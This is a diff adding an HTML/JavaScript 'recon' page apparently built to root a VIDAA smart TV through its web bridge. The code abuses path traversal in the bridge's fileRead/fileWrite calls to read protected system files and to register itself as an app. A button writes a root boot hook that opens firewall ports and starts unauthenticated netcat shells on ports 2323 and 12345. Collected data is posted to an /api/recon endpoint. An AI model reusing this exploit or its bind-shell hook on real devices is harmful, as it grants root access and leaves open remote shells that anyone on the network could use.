@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>recon</title>
+<style>
+  html, body { margin: 0; padding: 0; background: #000; color: #ccc; }
+  #out { font: 19px/1.4 Menlo, Consolas, monospace; white-space: pre-wrap;
+         word-break: break-all; padding: 10px; }
+  .ok { color: #8f8; } .err { color: #f88; } .warn { color: #fd6; } .hdr { color: #6cf; }
+  #btns { position: fixed; top: 6px; right: 6px; z-index: 2; }
+  #btns div { display: inline-block; background: #123; color: #6cf; border: 2px solid #6cf;
+              padding: 10px 16px; margin-left: 8px; font: bold 18px Menlo, monospace; }
+  #hook { background: #301; color: #f88; border-color: #f88; }
+</style>
+</head>
+<body>
+<div id="btns">
+  <div onclick="location.reload()">RERUN</div>
+  <div id="inst">INSTALL AS APP</div>
+  <div id="hook">INSTALL ROOT HOOK</div>
+</div>
+<div id="out"></div>
+<script>
+(function () {
+  "use strict";
+
+  // Recon v8.
+  // v7 established: the UART root-shell gate (key_check.sh) in full, the OEM
+  // white-name map (data-only), and the root primitive — rc.local executes
+  // /var/local/otaTest.sh (root) if present, and /var/local is bridge-writable.
+  // v8: reads the openssh/telnetd starter conditions, the superwatch config
+  // pointer, the JS-service package manifests, and — behind an explicit
+  // button — writes the root hook script.
+
+  var el = document.getElementById("out");
+  var report = {
+    started: new Date().toISOString(),
+    ua: navigator.userAgent,
+    marker: {},
+    files: {},
+    hook: {}
+  };
+
+  function trunc(s, n) {
+    s = String(s == null ? "" : s);
+    return s.length > n ? s.slice(0, n) + "…(" + s.length + " chars)" : s;
+  }
+
+  function normMsg(m) {
+    if (m == null) return "";
+    if (typeof m === "string") return m;
+    try { return JSON.stringify(m); } catch (e) { return String(m); }
+  }
+
+  function line(text, cls) {
+    var d = document.createElement("div");
+    d.textContent = text;
+    if (cls) d.className = cls;
+    el.appendChild(d);
+    window.scrollTo(0, document.body.scrollHeight);
+  }
+
+  function isOk(ret) {
+    if (ret === true) return true;
+    if (typeof ret === "number") return ret !== 0;
+    if (typeof ret === "string") return ret !== "" && ret !== "0";
+    return false;
+  }
+
+  function save(tag) {
+    try {
+      var x = new XMLHttpRequest();
+      x.open("POST", "/api/recon", true);
+      x.setRequestHeader("Content-Type", "application/json");
+      x.send(JSON.stringify({ tag: tag, at: new Date().toISOString(), report: report }));
+    } catch (e) { /* screen still shows results */ }
+  }
+
+  function hiCall(action, params) {
+    try {
+      if (typeof HiUtils_createRequest !== "function") return { error: "no bridge" };
+      var r = HiUtils_createRequest(action, params);
+      if (r && typeof r === "object") {
+        return { ret: r.ret, msg: normMsg(r.msg) };
+      }
+      return { value: trunc(r, 2000) };
+    } catch (e) {
+      return { exception: String(e) };
+    }
+  }
+
+  function rd(path) {
+    var r = hiCall("fileRead", { path: path, mode: 6 });
+    report.files[path] = r;
+    return r;
+  }
+
+  // The root hook. Runs as root at next boot (rc.local). Harvests root-only
+  // intel into world-readable dumps, starts telnetd on 2323, phones home.
+  // Remove via: rm /var/local/otaTest.sh (the hook also self-documents).
+	var HOOK = [
+	  '#!/bin/sh',
+	  '# alvidaa root hook — V0010.09.09A.P0930 (43A5FE)',
+	  'LOG=/var/local/otaTest.log',
+	  '{',
+	  'echo "=== root hook V0010.09.09A.P0930 $(date) ==="',
+	  'echo "--- rule keeper 2323 ---"',
+	  '/bin/toybox_selinux setsid /bin/sh -c "while :; do /usr/local/bin/iptables -C INPUT -p tcp --dport 2323 -j ACCEPT 2>/dev/null || /usr/local/bin/iptables -I INPUT 1 -p tcp --dport 2323 -j ACCEPT; sleep 20; done" > /dev/null 2>&1 &',
+	  'echo "--- listener 2323 ---"',
+	  '/bin/toybox_selinux setsid /bin/toybox_selinux nc -p 2323 -L /bin/sh -i > /var/local/nc.out 2>&1 &',
+	  'echo "--- listener 12345 (whitelisted) ---"',
+	  '/bin/toybox_selinux setsid /bin/toybox_selinux nc -p 12345 -L /bin/sh -i > /var/local/nc2.out 2>&1 &',
+	  'sleep 2',
+	  '/bin/toybox_selinux netstat -tln 2>&1 | grep -e 2323 -e 12345',
+	  'echo "=== root hook done ==="',
+	  '} > "$LOG" 2>&1',
+	  'chmod 644 "$LOG"'
+	].join("\n") + "\n";
+
+	function installHook() {
+		var status = document.getElementById("hook");
+		var cur = hiCall("fileRead", { path: "../var/local/otaTest.sh", mode: 6 });
+		if (isOk(cur.ret) && cur.msg.length > 0 && cur.msg.indexOf("alvidaa root hook") === -1 && cur.msg.indexOf("otaTest.log") === -1) {
+			status.textContent = "otaTest.sh EXISTS (foreign) — not overwriting";
+			status.style.color = "#f88";
+			report.hook = { status: "foreign-file-present", head: trunc(cur.msg, 400) };
+			save("hook");
+			return;
+		}
+		var w = hiCall("fileWrite", { path: "../var/local/otaTest.sh", mode: 6,
+									  writedata: HOOK });
+		var rb = hiCall("fileRead", { path: "../var/local/otaTest.sh", mode: 6 });
+		var verified = isOk(rb.ret) && rb.msg === HOOK;
+		report.hook = { status: verified ? "written+verified" : (isOk(w.ret) ? "written-CONTENT-MISMATCH" : "failed"),
+						write: w, readback_len: (rb.msg || "").length, expected_len: HOOK.length };
+		if (verified) {
+			status.textContent = "ROOT HOOK VERIFIED (" + HOOK.length + " b) — reboot the TV";
+			status.style.color = "#8f8";
+		} else if (isOk(w.ret)) {
+			status.textContent = "MISMATCH: got " + (rb.msg || "").length + " of " + HOOK.length +
+								 " bytes — DO NOT reboot, report back";
+			status.style.color = "#fd6";
+		} else {
+			status.textContent = "hook write failed: " + trunc(w.msg, 120);
+			status.style.color = "#f88";
+		}
+		save("hook");
+	}
+
+	var DUMP_TARGETS = [
+		"../var/local/otaTest.log",
+		"../var/local/otaTest.log",
+		"../usr/local/scripts/firewall-init-subrule.sh",
+		"../usr/local/scripts/firewall-eulaon.sh"
+	];
+
+  var PKG_DIR = "../APPS/pkgs/tv.vidaa.jsservice.basic/CHA/";
+
+  function run() {
+    line("== alvidaa recon v8 ==");
+	var dc = hiCall("deviceCode", {});
+	line("[deviceCode] " + trunc(JSON.stringify(dc), 200), "hdr");
+	report.files["__deviceCode"] = dc;
+    line(report.ua);
+    save("start");
+	// --- Trigger Level 9 Security Leak (checkAccessCode) ---
+	var secLeakStr = hiCall("checkAccessCode", "8000000000000990000");
+	line("[secLeakStr] " + trunc(JSON.stringify(secLeakStr), 200), "hdr");
+	report.files["__secLeakStr"] = secLeakStr;
+
+	var secLeakObj = hiCall("checkAccessCode", { code: "8000000000000990000" });
+	line("[secLeakObj] " + trunc(JSON.stringify(secLeakObj), 200), "hdr");
+	report.files["__secLeakObj"] = secLeakObj;
+	
+// fetchFile probe omitted (unsupported api on U07.51)
+
+    // 1. dump targets
+    line("-- root service conditions --", "hdr");
+    for (var j = 0; j < DUMP_TARGETS.length; j++) {
+      var t = DUMP_TARGETS[j];
+      var r = rd("../" + t);
+      if (isOk(r.ret)) {
+        line("[ok] /" + t + " (" + r.msg.length + " b): " + trunc(r.msg, 240), "ok");
+      } else {
+        line("[--] /" + t + ": " + trunc(r.msg, 90));
+      }
+    }
+    // directory-existence oracle for the openssh dir
+    var dirProbe = hiCall("fileRead", { path: "../usr/local/bin/openssh/", mode: 6 });
+    report.files["usr/local/bin/openssh/"] = dirProbe;
+    line("[dir] /usr/local/bin/openssh/ -> " + trunc(dirProbe.msg, 60) +
+      (String(dirProbe.msg).indexOf("EISDIR") !== -1 ? " (EXISTS)" : ""), "warn");
+    save("dumps");
+	
+	// --- write experiment: which param carries content? ---
+	var wt = [
+		{ tag: "A", key: "writedata", val: "AAA-writedata" },
+		{ tag: "B", key: "data",      val: "BBB-data" },
+		{ tag: "C", key: "content",   val: "CCC-content" }
+	];
+	for (var w = 0; w < wt.length; w++) {
+		var p1 = { path: "../tmp/wt_" + wt[w].tag, mode: 6 };
+		p1[wt[w].key] = wt[w].val;
+		var wr = hiCall("fileWrite", p1);
+		var rback = hiCall("fileRead", { path: "../tmp/wt_" + wt[w].tag, mode: 6 });
+		line("[write-" + wt[w].tag + "] wr_ok=" + isOk(wr.ret) +
+			 " readback=" + trunc(rback.msg, 60), "warn");
+		report.files["write_" + wt[w].tag] = { write: wr, readback: rback };
+	}
+
+    // 2. marker
+    var mk = PKG_DIR + ".recon_marker";
+    var m0 = hiCall("fileRead", { path: mk, mode: 6 });
+    report.marker = {
+      path: "/APPS/pkgs/tv.vidaa.jsservice.basic/CHA/.recon_marker",
+      existed_before: isOk(m0.ret),
+      content: isOk(m0.ret) ? trunc(m0.msg, 200) : null
+    };
+    line("[marker] " + (isOk(m0.ret) ? "present" : "missing"), "warn");
+    save("marker");
+
+    report.finished = new Date().toISOString();
+    save("final");
+    line("== done ==", "hdr");
+  }
+
+  document.getElementById("inst").addEventListener("click", function () {
+    var status = document.getElementById("inst");
+    try {
+      var base = location.href.replace(/recon\.html.*$/, "");
+      var icon = base + "icon.png";
+      var cur = hiCall("fileRead", { path: "websdk/Appinfo.json", mode: 6 });
+      var list = cur.ret ? JSON.parse(cur.msg) : { AppInfo: [] };
+      list.AppInfo = list.AppInfo.filter(function (a) { return a.Id !== "vidaa-recon"; });
+      list.AppInfo.push({
+        Id: "vidaa-recon", AppName: "Recon", Title: "Recon",
+        URL: base + "recon.html", StartCommand: base + "recon.html",
+        IconURL: icon, Icon_96: icon, Image: icon, Thumb: icon,
+        Type: "Browser", InstallTime: "2026-10-29",
+        RunTimes: 0, StoreType: "custom", PreInstall: false
+      });
+      var w = hiCall("fileWrite", { path: "websdk/Appinfo.json", mode: 6,
+                                    writedata: JSON.stringify(list) });
+      status.textContent = isOk(w.ret) ? "INSTALLED (restart TV)" : "install failed";
+      status.style.color = isOk(w.ret) ? "#8f8" : "#f88";
+    } catch (e) {
+      status.textContent = "install threw: " + String(e);
+    }
+  });
+
+  document.getElementById("hook").addEventListener("click", installHook);
+  run();
+})();
+</script>
+</body>
+</html>
